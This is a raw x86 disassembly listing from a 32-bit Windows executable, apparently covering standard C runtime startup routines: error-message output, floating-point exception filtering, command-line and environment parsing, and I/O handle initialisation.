  422e2e:	cmp    eax,0x1
  422e31:	je     0x422f27
  422e37:	cmp    eax,edx
  422e39:	jne    0x422e48
  422e3b:	cmp    DWORD PTR ds:0x4653ec,0x1
  422e42:	je     0x422f27
  422e48:	cmp    ecx,0xfc
  422e4e:	je     0x422f4c
  422e54:	push   0x104
  422e59:	lea    eax,[ebp-0x10c]
  422e5f:	push   eax
  422e60:	push   edx
  422e61:	mov    BYTE PTR [ebp-0x8],dl
  422e64:	call   DWORD PTR ds:0x42807c
  422e6a:	test   eax,eax
  422e6c:	jne    0x422e81
  422e6e:	lea    eax,[ebp-0x10c]
  422e74:	push   0x4284d4
  422e79:	push   eax
  422e7a:	call   0x423d30
  422e7f:	pop    ecx
  422e80:	pop    ecx
  422e81:	lea    eax,[ebp-0x10c]
  422e87:	push   eax
  422e88:	lea    edi,[ebp-0x10c]
  422e8e:	call   0x423f60
  422e93:	inc    eax
  422e94:	cmp    eax,0x3c
  422e97:	pop    ecx
  422e98:	jbe    0x422ec3
  422e9a:	lea    eax,[ebp-0x10c]
  422ea0:	push   eax
  422ea1:	call   0x423f60
  422ea6:	mov    edi,eax
  422ea8:	lea    eax,[ebp-0x10c]
  422eae:	sub    eax,0x3b
  422eb1:	push   0x3
  422eb3:	add    edi,eax
  422eb5:	push   0x4284d0
  422eba:	push   edi
  422ebb:	call   0x423e30
  422ec0:	add    esp,0x10
  422ec3:	push   edi
  422ec4:	call   0x423f60
  422ec9:	push   DWORD PTR [esi+0x4653f4]
  422ecf:	mov    ebx,eax
  422ed1:	call   0x423f60
  422ed6:	lea    eax,[ebx+eax*1+0x1c]
  422eda:	pop    ecx
  422edb:	add    eax,0x3
  422ede:	pop    ecx
  422edf:	and    eax,0xfffffffc
  422ee2:	call   0x4239a0
  422ee7:	mov    ebx,esp
  422ee9:	push   0x4284b4
  422eee:	push   ebx
  422eef:	call   0x423d30
  422ef4:	push   edi
  422ef5:	push   ebx
  422ef6:	call   0x423d40
  422efb:	push   0x4284b0
  422f00:	push   ebx
  422f01:	call   0x423d40
  422f06:	push   DWORD PTR [esi+0x4653f4]
  422f0c:	push   ebx
  422f0d:	call   0x423d40
  422f12:	push   0x12010
  422f17:	push   0x428488
  422f1c:	push   ebx
  422f1d:	call   0x423c32
  422f22:	add    esp,0x2c
  422f25:	jmp    0x422f4c
  422f27:	push   edx
  422f28:	lea    eax,[ebp+0x8]
  422f2b:	push   eax
  422f2c:	lea    esi,[esi+0x4653f4]
  422f32:	push   DWORD PTR [esi]
  422f34:	call   0x423f60
  422f39:	pop    ecx
  422f3a:	push   eax
  422f3b:	push   DWORD PTR [esi]
  422f3d:	push   0xfffffff4
  422f3f:	call   DWORD PTR ds:0x428078
  422f45:	push   eax
  422f46:	call   DWORD PTR ds:0x428074
  422f4c:	lea    esp,[ebp-0x118]
  422f52:	mov    ecx,DWORD PTR [ebp-0x4]
  422f55:	xor    ecx,DWORD PTR [ebp+0x4]
  422f58:	call   0x42401c
  422f5d:	pop    edi
  422f5e:	pop    esi
  422f5f:	pop    ebx
  422f60:	leave  
  422f61:	ret    
  422f62:	mov    eax,ds:0x465cfc
  422f67:	cmp    eax,0x1
  422f6a:	je     0x422f79
  422f6c:	test   eax,eax
  422f6e:	jne    0x422f9a
  422f70:	cmp    DWORD PTR ds:0x4653ec,0x1
  422f77:	jne    0x422f9a
  422f79:	push   0xfc
  422f7e:	call   0x422deb
  422f83:	mov    eax,ds:0x465d48
  422f88:	test   eax,eax
  422f8a:	pop    ecx
  422f8b:	je     0x422f8f
  422f8d:	call   eax
  422f8f:	push   0xff
  422f94:	call   0x422deb
  422f99:	pop    ecx
  422f9a:	ret    
  422f9b:	push   ebp
  422f9c:	mov    ebp,esp
  422f9e:	push   ecx
  422f9f:	push   ebx
  422fa0:	push   esi
  422fa1:	push   edi
  422fa2:	call   0x423803
  422fa7:	mov    edi,DWORD PTR [ebp+0x8]
  422faa:	mov    esi,eax
  422fac:	mov    edx,DWORD PTR [esi+0x54]
  422faf:	mov    eax,ds:0x465504
  422fb4:	mov    ecx,edx
  422fb6:	cmp    DWORD PTR [ecx],edi
  422fb8:	je     0x422fc7
  422fba:	lea    ebx,[eax+eax*2]
  422fbd:	add    ecx,0xc
  422fc0:	lea    ebx,[edx+ebx*4]
  422fc3:	cmp    ecx,ebx
  422fc5:	jb     0x422fb6
  422fc7:	lea    eax,[eax+eax*2]
  422fca:	lea    eax,[edx+eax*4]
  422fcd:	cmp    ecx,eax
  422fcf:	jae    0x422fd5
  422fd1:	cmp    DWORD PTR [ecx],edi
  422fd3:	je     0x422fd7
  422fd5:	xor    ecx,ecx
  422fd7:	test   ecx,ecx
  422fd9:	je     0x4230f1
  422fdf:	mov    ebx,DWORD PTR [ecx+0x8]
  422fe2:	test   ebx,ebx
  422fe4:	mov    DWORD PTR [ebp+0x8],ebx
  422fe7:	je     0x4230f1
  422fed:	cmp    ebx,0x5
  422ff0:	jne    0x422ffe
  422ff2:	and    DWORD PTR [ecx+0x8],0x0
  422ff6:	xor    eax,eax
  422ff8:	inc    eax
  422ff9:	jmp    0x4230fa
  422ffe:	cmp    ebx,0x1
  423001:	je     0x4230ec
  423007:	mov    eax,DWORD PTR [esi+0x58]
  42300a:	mov    DWORD PTR [ebp-0x4],eax
  42300d:	mov    eax,DWORD PTR [ebp+0xc]
  423010:	mov    DWORD PTR [esi+0x58],eax
  423013:	mov    eax,DWORD PTR [ecx+0x4]
  423016:	cmp    eax,0x8
  423019:	jne    0x4230de
  42301f:	mov    edx,DWORD PTR ds:0x4654f8
  423025:	mov    eax,ds:0x4654fc
  42302a:	add    eax,edx
  42302c:	cmp    edx,eax
  42302e:	jge    0x423057
  423030:	lea    eax,[edx+edx*2]
  423033:	shl    eax,0x2
  423036:	mov    edi,DWORD PTR [esi+0x54]
  423039:	and    DWORD PTR [eax+edi*1+0x8],0x0
  42303e:	mov    edi,DWORD PTR ds:0x4654f8
  423044:	mov    ebx,DWORD PTR ds:0x4654fc
  42304a:	inc    edx
  42304b:	add    ebx,edi
  42304d:	add    eax,0xc
  423050:	cmp    edx,ebx
  423052:	jl     0x423036
  423054:	mov    ebx,DWORD PTR [ebp+0x8]
  423057:	mov    ecx,DWORD PTR [ecx]
  423059:	cmp    ecx,0xc000008e
  42305f:	mov    edi,DWORD PTR [esi+0x5c]
  423062:	jne    0x42306d
  423064:	mov    DWORD PTR [esi+0x5c],0x83
  42306b:	jmp    0x4230d1
  42306d:	cmp    ecx,0xc0000090
  423073:	jne    0x42307e
  423075:	mov    DWORD PTR [esi+0x5c],0x81
  42307c:	jmp    0x4230d1
  42307e:	cmp    ecx,0xc0000091
  423084:	jne    0x42308f
  423086:	mov    DWORD PTR [esi+0x5c],0x84
  42308d:	jmp    0x4230d1
  42308f:	cmp    ecx,0xc0000093
  423095:	jne    0x4230a0
  423097:	mov    DWORD PTR [esi+0x5c],0x85
  42309e:	jmp    0x4230d1
  4230a0:	cmp    ecx,0xc000008d
  4230a6:	jne    0x4230b1
  4230a8:	mov    DWORD PTR [esi+0x5c],0x82
  4230af:	jmp    0x4230d1
  4230b1:	cmp    ecx,0xc000008f
  4230b7:	jne    0x4230c2
  4230b9:	mov    DWORD PTR [esi+0x5c],0x86
  4230c0:	jmp    0x4230d1
  4230c2:	cmp    ecx,0xc0000092
  4230c8:	jne    0x4230d1
  4230ca:	mov    DWORD PTR [esi+0x5c],0x8a
  4230d1:	push   DWORD PTR [esi+0x5c]
  4230d4:	push   0x8
  4230d6:	call   ebx
  4230d8:	pop    ecx
  4230d9:	mov    DWORD PTR [esi+0x5c],edi
  4230dc:	jmp    0x4230e5
  4230de:	and    DWORD PTR [ecx+0x8],0x0
  4230e2:	push   eax
  4230e3:	call   ebx
  4230e5:	mov    eax,DWORD PTR [ebp-0x4]
  4230e8:	pop    ecx
  4230e9:	mov    DWORD PTR [esi+0x58],eax
  4230ec:	or     eax,0xffffffff
  4230ef:	jmp    0x4230fa
  4230f1:	push   DWORD PTR [ebp+0xc]
  4230f4:	call   DWORD PTR ds:0x428080
  4230fa:	pop    edi
  4230fb:	pop    esi
  4230fc:	pop    ebx
  4230fd:	leave  
  4230fe:	ret    
  4230ff:	cmp    DWORD PTR ds:0x4664ac,0x0
  423106:	jne    0x42310d
  423108:	call   0x42453c
  42310d:	push   esi
  42310e:	mov    esi,DWORD PTR ds:0x4664b4
  423114:	test   esi,esi
  423116:	jne    0x42311f
  423118:	mov    esi,0x4284eb
  42311d:	jmp    0x423164
  42311f:	mov    al,BYTE PTR [esi]
  423121:	cmp    al,0x22
  423123:	jne    0x42314d
  423125:	inc    esi
  423126:	mov    al,BYTE PTR [esi]
  423128:	cmp    al,0x22
  42312a:	je     0x42315d
  42312c:	test   al,al
  42312e:	je     0x423146
  423130:	movzx  eax,al
  423133:	push   eax
  423134:	call   0x42405b
  423139:	test   eax,eax
  42313b:	pop    ecx
  42313c:	je     0x42313f
  42313e:	inc    esi
  42313f:	inc    esi
  423140:	mov    al,BYTE PTR [esi]
  423142:	cmp    al,0x22
  423144:	jne    0x42312c
  423146:	cmp    BYTE PTR [esi],0x22
  423149:	jne    0x42315e
  42314b:	jmp    0x42315d
  42314d:	cmp    al,0x20
  42314f:	jbe    0x42315e
  423151:	inc    esi
  423152:	cmp    BYTE PTR [esi],0x20
  423155:	ja     0x423151
  423157:	jmp    0x42315e
  423159:	cmp    al,0x20
  42315b:	ja     0x423164
  42315d:	inc    esi
  42315e:	mov    al,BYTE PTR [esi]
  423160:	test   al,al
  423162:	jne    0x423159
  423164:	mov    eax,esi
  423166:	pop    esi
  423167:	ret    
  423168:	push   ebx
  423169:	xor    ebx,ebx
  42316b:	cmp    DWORD PTR ds:0x4664ac,ebx
  423171:	push   esi
  423172:	push   edi
  423173:	jne    0x42317a
  423175:	call   0x42453c
  42317a:	mov    esi,DWORD PTR ds:0x465cf4
  423180:	xor    edi,edi
  423182:	cmp    esi,ebx
  423184:	jne    0x423198
  423186:	jmp    0x4231b8
  423188:	cmp    al,0x3d
  42318a:	je     0x42318d
  42318c:	inc    edi
  42318d:	push   esi
  42318e:	call   0x423f60
  423193:	pop    ecx
  423194:	lea    esi,[esi+eax*1+0x1]
  423198:	mov    al,BYTE PTR [esi]
  42319a:	cmp    al,bl
  42319c:	jne    0x423188
  42319e:	lea    eax,[edi*4+0x4]
  4231a5:	push   eax
  4231a6:	call   0x424672
  4231ab:	mov    edi,eax
  4231ad:	cmp    edi,ebx
  4231af:	pop    ecx
  4231b0:	mov    DWORD PTR ds:0x465d24,edi
  4231b6:	jne    0x4231bd
  4231b8:	or     eax,0xffffffff
  4231bb:	jmp    0x423215
  4231bd:	mov    esi,DWORD PTR ds:0x465cf4
  4231c3:	push   ebp
  4231c4:	jmp    0x4231f0
  4231c6:	push   esi
  4231c7:	call   0x423f60
  4231cc:	mov    ebp,eax
  4231ce:	inc    ebp
  4231cf:	cmp    BYTE PTR [esi],0x3d
  4231d2:	pop    ecx
  4231d3:	je     0x4231ee
  4231d5:	push   ebp
  4231d6:	call   0x424672
  4231db:	cmp    eax,ebx
  4231dd:	pop    ecx
  4231de:	mov    DWORD PTR [edi],eax
  4231e0:	je     0x423219
  4231e2:	push   esi
  4231e3:	push   eax
  4231e4:	call   0x423d30
  4231e9:	pop    ecx
  4231ea:	pop    ecx
  4231eb:	add    edi,0x4
  4231ee:	add    esi,ebp
  4231f0:	cmp    BYTE PTR [esi],bl
  4231f2:	jne    0x4231c6
  4231f4:	push   DWORD PTR ds:0x465cf4
  4231fa:	call   0x42455a
  4231ff:	mov    DWORD PTR ds:0x465cf4,ebx
  423205:	mov    DWORD PTR [edi],ebx
  423207:	mov    DWORD PTR ds:0x4664a0,0x1
  423211:	xor    eax,eax
  423213:	pop    ecx
  423214:	pop    ebp
  423215:	pop    edi
  423216:	pop    esi
  423217:	pop    ebx
  423218:	ret    
  423219:	push   DWORD PTR ds:0x465d24
  42321f:	call   0x42455a
  423224:	mov    DWORD PTR ds:0x465d24,ebx
  42322a:	or     eax,0xffffffff
  42322d:	jmp    0x423213
  42322f:	push   ebp
  423230:	mov    ebp,esp
  423232:	push   ecx
  423233:	push   ebx
  423234:	mov    ebx,DWORD PTR [ebp+0xc]
  423237:	xor    edx,edx
  423239:	cmp    DWORD PTR [ebp+0x8],edx
  42323c:	push   edi
  42323d:	mov    DWORD PTR [esi],edx
  42323f:	mov    edi,ecx
  423241:	mov    DWORD PTR [ebx],0x1
  423247:	je     0x423252
  423249:	mov    ecx,DWORD PTR [ebp+0x8]
  42324c:	add    DWORD PTR [ebp+0x8],0x4
  423250:	mov    DWORD PTR [ecx],edi
  423252:	cmp    BYTE PTR [eax],0x22
  423255:	jne    0x423265
  423257:	xor    ecx,ecx
  423259:	test   edx,edx
  42325b:	sete   cl
  42325e:	inc    eax
  42325f:	mov    edx,ecx
  423261:	mov    cl,0x22
  423263:	jmp    0x423292
  423265:	inc    DWORD PTR [esi]
  423267:	test   edi,edi
  423269:	je     0x423270
  42326b:	mov    cl,BYTE PTR [eax]
  42326d:	mov    BYTE PTR [edi],cl
  42326f:	inc    edi
  423270:	mov    cl,BYTE PTR [eax]
  423272:	movzx  ebx,cl
  423275:	inc    eax
  423276:	test   BYTE PTR [ebx+0x466161],0x4
  42327d:	je     0x42328b
  42327f:	inc    DWORD PTR [esi]
  423281:	test   edi,edi
  423283:	je     0x42328a
  423285:	mov    bl,BYTE PTR [eax]
  423287:	mov    BYTE PTR [edi],bl
  423289:	inc    edi
  42328a:	inc    eax
  42328b:	test   cl,cl
  42328d:	mov    ebx,DWORD PTR [ebp+0xc]
  423290:	je     0x4232c4
  423292:	test   edx,edx
  423294:	jne    0x423252
  423296:	cmp    cl,0x20
  423299:	je     0x4232a0
  42329b:	cmp    cl,0x9
  42329e:	jne    0x423252
  4232a0:	test   edi,edi
  4232a2:	je     0x4232a8
  4232a4:	and    BYTE PTR [edi-0x1],0x0
  4232a8:	and    DWORD PTR [ebp-0x4],0x0
  4232ac:	cmp    BYTE PTR [eax],0x0
  4232af:	je     0x42338b
  4232b5:	mov    cl,BYTE PTR [eax]
  4232b7:	cmp    cl,0x20
  4232ba:	je     0x4232c1
  4232bc:	cmp    cl,0x9
  4232bf:	jne    0x4232c7
  4232c1:	inc    eax
  4232c2:	jmp    0x4232b5
  4232c4:	dec    eax
  4232c5:	jmp    0x4232a8
  4232c7:	cmp    BYTE PTR [eax],0x0
  4232ca:	je     0x42338b
  4232d0:	cmp    DWORD PTR [ebp+0x8],0x0
  4232d4:	je     0x4232df
  4232d6:	mov    ecx,DWORD PTR [ebp+0x8]
  4232d9:	add    DWORD PTR [ebp+0x8],0x4
  4232dd:	mov    DWORD PTR [ecx],edi
  4232df:	inc    DWORD PTR [ebx]
  4232e1:	xor    ebx,ebx
  4232e3:	inc    ebx
  4232e4:	xor    edx,edx
  4232e6:	jmp    0x4232ea
  4232e8:	inc    eax
  4232e9:	inc    edx
  4232ea:	cmp    BYTE PTR [eax],0x5c
  4232ed:	je     0x4232e8
  4232ef:	cmp    BYTE PTR [eax],0x22
  4232f2:	jne    0x42331a
  4232f4:	test   dl,0x1
  4232f7:	jne    0x423318
  4232f9:	cmp    DWORD PTR [ebp-0x4],0x0
  4232fd:	je     0x42330b
  4232ff:	lea    ecx,[eax+0x1]
  423302:	cmp    BYTE PTR [ecx],0x22
  423305:	jne    0x42330b
  423307:	mov    eax,ecx
  423309:	jmp    0x42330d
  42330b:	xor    ebx,ebx
  42330d:	xor    ecx,ecx
  42330f:	cmp    DWORD PTR [ebp-0x4],ecx
  423312:	sete   cl
  423315:	mov    DWORD PTR [ebp-0x4],ecx
  423318:	shr    edx,1
  42331a:	test   edx,edx
  42331c:	je     0x42332b
  42331e:	test   edi,edi
  423320:	je     0x423326
  423322:	mov    BYTE PTR [edi],0x5c
  423325:	inc    edi
  423326:	inc    DWORD PTR [esi]
  423328:	dec    edx
  423329:	jne    0x42331e
  42332b:	mov    cl,BYTE PTR [eax]
  42332d:	test   cl,cl
  42332f:	je     0x423379
  423331:	cmp    DWORD PTR [ebp-0x4],0x0
  423335:	jne    0x423341
  423337:	cmp    cl,0x20
  42333a:	je     0x423379
  42333c:	cmp    cl,0x9
  42333f:	je     0x423379
  423341:	test   ebx,ebx
  423343:	je     0x423373
  423345:	test   edi,edi
  423347:	je     0x423362
  423349:	movzx  edx,cl
  42334c:	test   BYTE PTR [edx+0x466161],0x4
  423353:	je     0x42335b
  423355:	mov    BYTE PTR [edi],cl
  423357:	inc    edi
  423358:	inc    eax
  423359:	inc    DWORD PTR [esi]
  42335b:	mov    cl,BYTE PTR [eax]
  42335d:	mov    BYTE PTR [edi],cl
  42335f:	inc    edi
  423360:	jmp    0x423371
  423362:	movzx  ecx,cl
  423365:	test   BYTE PTR [ecx+0x466161],0x4
  42336c:	je     0x423371
  42336e:	inc    eax
  42336f:	inc    DWORD PTR [esi]
  423371:	inc    DWORD PTR [esi]
  423373:	inc    eax
  423374:	jmp    0x4232e1
  423379:	test   edi,edi
  42337b:	je     0x423381
  42337d:	and    BYTE PTR [edi],0x0
  423380:	inc    edi
  423381:	inc    DWORD PTR [esi]
  423383:	mov    ebx,DWORD PTR [ebp+0xc]
  423386:	jmp    0x4232ac
  42338b:	mov    eax,DWORD PTR [ebp+0x8]
  42338e:	test   eax,eax
  423390:	je     0x423395
  423392:	and    DWORD PTR [eax],0x0
  423395:	inc    DWORD PTR [ebx]
  423397:	pop    edi
  423398:	pop    ebx
  423399:	leave  
  42339a:	ret    
  42339b:	push   ebp
  42339c:	mov    ebp,esp
  42339e:	push   ecx
  42339f:	push   ecx
  4233a0:	push   ebx
  4233a1:	push   esi
  4233a2:	push   edi
  4233a3:	xor    edi,edi
  4233a5:	cmp    DWORD PTR ds:0x4664ac,edi
  4233ab:	jne    0x4233b2
  4233ad:	call   0x42453c
  4233b2:	and    BYTE PTR ds:0x465e54,0x0
  4233b9:	push   0x104
  4233be:	mov    esi,0x465d50
  4233c3:	push   esi
  4233c4:	push   edi
  4233c5:	call   DWORD PTR ds:0x42807c
  4233cb:	mov    eax,ds:0x4664b4
  4233d0:	cmp    eax,edi
  4233d2:	mov    DWORD PTR ds:0x465d34,esi
  4233d8:	je     0x4233e1
  4233da:	cmp    BYTE PTR [eax],0x0
  4233dd:	mov    ebx,eax
  4233df:	jne    0x4233e3
  4233e1:	mov    ebx,esi
  4233e3:	lea    eax,[ebp-0x4]
  4233e6:	push   eax
  4233e7:	push   edi
  4233e8:	lea    esi,[ebp-0x8]
  4233eb:	xor    ecx,ecx
  4233ed:	mov    eax,ebx
  4233ef:	call   0x42322f
  4233f4:	mov    esi,DWORD PTR [ebp-0x4]
  4233f7:	mov    eax,DWORD PTR [ebp-0x8]
  4233fa:	shl    esi,0x2
  4233fd:	add    eax,esi
  4233ff:	push   eax
  423400:	call   0x424672
  423405:	mov    edi,eax
  423407:	add    esp,0xc
  42340a:	test   edi,edi
  42340c:	jne    0x423413
  42340e:	or     eax,0xffffffff
  423411:	jmp    0x423438
  423413:	lea    eax,[ebp-0x4]
  423416:	push   eax
  423417:	lea    ecx,[esi+edi*1]
  42341a:	push   edi
  42341b:	lea    esi,[ebp-0x8]
  42341e:	mov    eax,ebx
  423420:	call   0x42322f
  423425:	mov    eax,DWORD PTR [ebp-0x4]
  423428:	dec    eax
  423429:	pop    ecx
  42342a:	mov    ds:0x465d18,eax
  42342f:	pop    ecx
  423430:	mov    DWORD PTR ds:0x465d1c,edi
  423436:	xor    eax,eax
  423438:	pop    edi
  423439:	pop    esi
  42343a:	pop    ebx
  42343b:	leave  
  42343c:	ret    
  42343d:	push   ecx
  42343e:	push   ecx
  42343f:	mov    eax,ds:0x465e58
  423444:	push   ebx
  423445:	push   ebp
  423446:	push   esi
  423447:	push   edi
  423448:	mov    edi,DWORD PTR ds:0x428094
  42344e:	xor    ebx,ebx
  423450:	xor    esi,esi
  423452:	cmp    eax,ebx
  423454:	push   0x2
  423456:	pop    ebp
  423457:	jne    0x423486
  423459:	call   edi
  42345b:	mov    esi,eax
  42345d:	cmp    esi,ebx
  42345f:	je     0x42346d
  423461:	mov    DWORD PTR ds:0x465e58,0x1
  42346b:	jmp    0x42348b
  42346d:	call   DWORD PTR ds:0x42803c
  423473:	cmp    eax,0x78
  423476:	jne    0x423481
  423478:	mov    eax,ebp
  42347a:	mov    ds:0x465e58,eax
  42347f:	jmp    0x423486
  423481:	mov    eax,ds:0x465e58
  423486:	cmp    eax,0x1
  423489:	jne    0x423508
  42348b:	cmp    esi,ebx
  42348d:	jne    0x423497
  42348f:	call   edi
  423491:	mov    esi,eax
  423493:	cmp    esi,ebx
  423495:	je     0x423510
  423497:	cmp    WORD PTR [esi],bx
  42349a:	mov    eax,esi
  42349c:	je     0x4234ac
  42349e:	add    eax,ebp
  4234a0:	cmp    WORD PTR [eax],bx
  4234a3:	jne    0x42349e
  4234a5:	add    eax,ebp
  4234a7:	cmp    WORD PTR [eax],bx
  4234aa:	jne    0x42349e
  4234ac:	mov    edi,DWORD PTR ds:0x428090
  4234b2:	push   ebx
  4234b3:	push   ebx
  4234b4:	push   ebx
  4234b5:	sub    eax,esi
  4234b7:	push   ebx
  4234b8:	sar    eax,1
  4234ba:	inc    eax
  4234bb:	push   eax
  4234bc:	push   esi
  4234bd:	push   ebx
  4234be:	push   ebx
  4234bf:	mov    DWORD PTR [esp+0x34],eax
  4234c3:	call   edi
  4234c5:	mov    ebp,eax
  4234c7:	cmp    ebp,ebx
  4234c9:	je     0x4234fd
  4234cb:	push   ebp
  4234cc:	call   0x424672
  4234d1:	cmp    eax,ebx
  4234d3:	pop    ecx
  4234d4:	mov    DWORD PTR [esp+0x10],eax
  4234d8:	je     0x4234fd
  4234da:	push   ebx
  4234db:	push   ebx
  4234dc:	push   ebp
  4234dd:	push   eax
  4234de:	push   DWORD PTR [esp+0x24]
  4234e2:	push   esi
  4234e3:	push   ebx
  4234e4:	push   ebx
  4234e5:	call   edi
  4234e7:	test   eax,eax
  4234e9:	jne    0x4234f9
  4234eb:	push   DWORD PTR [esp+0x10]
  4234ef:	call   0x42455a
  4234f4:	pop    ecx
  4234f5:	mov    DWORD PTR [esp+0x10],ebx
  4234f9:	mov    ebx,DWORD PTR [esp+0x10]
  4234fd:	push   esi
  4234fe:	call   DWORD PTR ds:0x42808c
  423504:	mov    eax,ebx
  423506:	jmp    0x423558
  423508:	cmp    eax,ebp
  42350a:	je     0x423514
  42350c:	cmp    eax,ebx
  42350e:	je     0x423514
  423510:	xor    eax,eax
  423512:	jmp    0x423558
  423514:	call   DWORD PTR ds:0x428088
  42351a:	mov    esi,eax
  42351c:	cmp    esi,ebx
  42351e:	je     0x423510
  423520:	cmp    BYTE PTR [esi],bl
  423522:	je     0x42352e
  423524:	inc    eax
  423525:	cmp    BYTE PTR [eax],bl
  423527:	jne    0x423524
  423529:	inc    eax
  42352a:	cmp    BYTE PTR [eax],bl
  42352c:	jne    0x423524
  42352e:	sub    eax,esi
  423530:	inc    eax
  423531:	mov    ebp,eax
  423533:	push   ebp
  423534:	call   0x424672
  423539:	mov    edi,eax
  42353b:	cmp    edi,ebx
  42353d:	pop    ecx
  42353e:	jne    0x423544
  423540:	xor    edi,edi
  423542:	jmp    0x42354f
  423544:	push   ebp
  423545:	push   esi
  423546:	push   edi
  423547:	call   0x424690
  42354c:	add    esp,0xc
  42354f:	push   esi
  423550:	call   DWORD PTR ds:0x428084
  423556:	mov    eax,edi
  423558:	pop    edi
  423559:	pop    esi
  42355a:	pop    ebp
  42355b:	pop    ebx
  42355c:	pop    ecx
  42355d:	pop    ecx
  42355e:	ret    
  42355f:	sub    esp,0x48
  423562:	push   ebx
  423563:	mov    ebx,0x480
  423568:	push   ebx
  423569:	call   0x424672
  42356e:	test   eax,eax
  423570:	pop    ecx
  423571:	jne    0x42357b
  423573:	or     eax,0xffffffff
  423576:	jmp    0x423758
  42357b:	mov    ds:0x4663a0,eax
  423580:	mov    DWORD PTR ds:0x466388,0x20
  42358a:	lea    ecx,[eax+0x480]
  423590:	jmp    0x4235b0
  423592:	and    BYTE PTR [eax+0x4],0x0
  423596:	or     DWORD PTR [eax],0xffffffff
  423599:	and    DWORD PTR [eax+0x8],0x0
  42359d:	mov    BYTE PTR [eax+0x5],0xa
  4235a1:	mov    ecx,DWORD PTR ds:0x4663a0
  4235a7:	add    eax,0x24
  4235aa:	add    ecx,0x480
  4235b0:	cmp    eax,ecx
  4235b2:	jb     0x423592
  4235b4:	push   ebp
  4235b5:	push   esi
  4235b6:	push   edi
  4235b7:	lea    eax,[esp+0x14]
  4235bb:	push   eax
  4235bc:	call   DWORD PTR ds:0x42805c
  4235c2:	cmp    WORD PTR [esp+0x46],0x0
  4235c8:	je     0x4236b7
  4235ce:	mov    eax,DWORD PTR [esp+0x48]
  4235d2:	test   eax,eax
  4235d4:	je     0x4236b7
  4235da:	mov    edi,DWORD PTR [eax]
  4235dc:	lea    ebp,[eax+0x4]
  4235df:	lea    eax,[edi+ebp*1]
  4235e2:	mov    DWORD PTR [esp+0x10],eax
  4235e6:	mov    eax,0x800
  4235eb:	cmp    edi,eax
  4235ed:	jl     0x4235f1
  4235ef:	mov    edi,eax
  4235f1:	cmp    DWORD PTR ds:0x466388,edi
  4235f7:	jge    0x423647
  4235f9:	mov    esi,0x4663a4
  4235fe:	push   ebx
  4235ff:	call   0x424672
  423604:	test   eax,eax
  423606:	pop    ecx
  423607:	je     0x423641
  423609:	add    DWORD PTR ds:0x466388,0x20
  423610:	mov    DWORD PTR [esi],eax
  423612:	lea    ecx,[eax+0x480]
  423618:	jmp    0x423630
  42361a:	and    BYTE PTR [eax+0x4],0x0
  42361e:	or     DWORD PTR [eax],0xffffffff
  423621:	and    DWORD PTR [eax+0x8],0x0
  423625:	mov    BYTE PTR [eax+0x5],0xa
  423629:	mov    ecx,DWORD PTR [esi]
  42362b:	add    eax,0x24
  42362e:	add    ecx,ebx
  423630:	cmp    eax,ecx
  423632:	jb     0x42361a
  423634:	add    esi,0x4
  423637:	cmp    DWORD PTR ds:0x466388,edi
  42363d:	jl     0x4235fe
  42363f:	jmp    0x423647
  423641:	mov    edi,DWORD PTR ds:0x466388
  423647:	xor    ebx,ebx
  423649:	test   edi,edi
  42364b:	jle    0x4236b7
  42364d:	mov    eax,DWORD PTR [esp+0x10]
  423651:	mov    eax,DWORD PTR [eax]
  423653:	cmp    eax,0xffffffff
  423656:	je     0x4236ac
  423658:	mov    cl,BYTE PTR [ebp+0x0]
  42365b:	test   cl,0x1
  42365e:	je     0x4236ac
  423660:	test   cl,0x8
  423663:	jne    0x423670
  423665:	push   eax
  423666:	call   DWORD PTR ds:0x42809c
  42366c:	test   eax,eax
  42366e:	je     0x4236ac
  423670:	mov    ecx,ebx
  423672:	mov    eax,ebx
  423674:	and    eax,0x1f
  423677:	lea    eax,[eax+eax*8]
  42367a:	sar    ecx,0x5
  42367d:	mov    ecx,DWORD PTR [ecx*4+0x4663a0]
  423684:	lea    esi,[ecx+eax*4]
  423687:	mov    eax,DWORD PTR [esp+0x10]
  42368b:	mov    eax,DWORD PTR [eax]
  42368d:	mov    DWORD PTR [esi],eax
  42368f:	mov    al,BYTE PTR [ebp+0x0]
  423692:	mov    BYTE PTR [esi+0x4],al
  423695:	lea    eax,[esi+0xc]
  423698:	push   0xfa0
  42369d:	push   eax
  42369e:	call   0x4249dd
  4236a3:	test   eax,eax
  4236a5:	pop    ecx
  4236a6:	pop    ecx
  4236a7:	je     0x4236d7
  4236a9:	inc    DWORD PTR [esi+0x8]
  4236ac:	add    DWORD PTR [esp+0x10],0x4
  4236b1:	inc    ebx
  4236b2:	inc    ebp
  4236b3:	cmp    ebx,edi
  4236b5:	jl     0x42364d
  4236b7:	xor    ebx,ebx
  4236b9:	mov    ecx,DWORD PTR ds:0x4663a0
  4236bf:	lea    eax,[ebx+ebx*8]
  4236c2:	lea    esi,[ecx+eax*4]
  4236c5:	cmp    DWORD PTR [esi],0xffffffff
  4236c8:	jne    0x423739
  4236ca:	test   ebx,ebx
  4236cc:	mov    BYTE PTR [esi+0x4],0x81
  4236d0:	jne    0x4236dc
  4236d2:	push   0xfffffff6
  4236d4:	pop    eax
  4236d5:	jmp    0x4236e6
  4236d7:	or     eax,0xffffffff
  4236da:	jmp    0x423755
  4236dc:	mov    eax,ebx
  4236de:	dec    eax
  4236df:	neg    eax
  4236e1:	sbb    eax,eax
  4236e3:	add    eax,0xfffffff5
  4236e6:	push   eax
  4236e7:	call   DWORD PTR ds:0x428078
  4236ed:	mov    edi,eax
  4236ef:	cmp    edi,0xffffffff
  4236f2:	je     0x423733
  4236f4:	push   edi
  4236f5:	call   DWORD PTR ds:0x42809c
  4236fb:	test   eax,eax
  4236fd:	je     0x423733
  4236ff:	and    eax,0xff
  423704:	cmp    eax,0x2
  423707:	mov    DWORD PTR [esi],edi
  423709:	jne    0x423711
  42370b:	or     BYTE PTR [esi+0x4],0x40
  42370f:	jmp    0x42371a
  423711:	cmp    eax,0x3
  423714:	jne    0x42371a
  423716:	or     BYTE PTR [esi+0x4],0x8
  42371a:	lea    eax,[esi+0xc]
  42371d:	push   0xfa0
  423722:	push   eax
  423723:	call   0x4249dd
  423728:	test   eax,eax
  42372a:	pop    ecx
  42372b:	pop    ecx
  42372c:	je     0x4236d7
  42372e:	inc    DWORD PTR [esi+0x8]
  423731:	jmp    0x42373d
  423733:	or     BYTE PTR [esi+0x4],0x40
  423737:	jmp    0x42373d
  423739:	or     BYTE PTR [esi+0x4],0x80
  42373d:	inc    ebx
  42373e:	cmp    ebx,0x3
  423741:	jl     0x4236b9
  423747:	push   DWORD PTR ds:0x466388
  42374d:	call   DWORD PTR ds:0x428098
  423753:	xor    eax,eax
